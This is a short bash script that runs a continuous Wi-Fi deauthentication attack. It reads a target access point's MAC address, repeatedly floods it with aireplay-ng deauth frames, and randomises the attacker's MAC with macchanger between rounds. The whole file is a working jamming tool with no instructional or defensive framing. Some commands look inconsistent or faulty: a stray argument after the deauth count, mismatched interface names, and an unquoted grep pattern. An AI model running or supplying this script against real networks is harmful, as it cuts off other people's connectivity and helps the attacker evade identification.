#!/bin/bash

read mac

while true
do
	aireplay-ng -0 0 10 -a $mac wlan0
	ifconfig wlan0 down
	macchanger -r wlan0mon | grep New MAC
	iwconfig wlan0 mode monitor
	ifconfig wlan0 up
	sleep 5
done
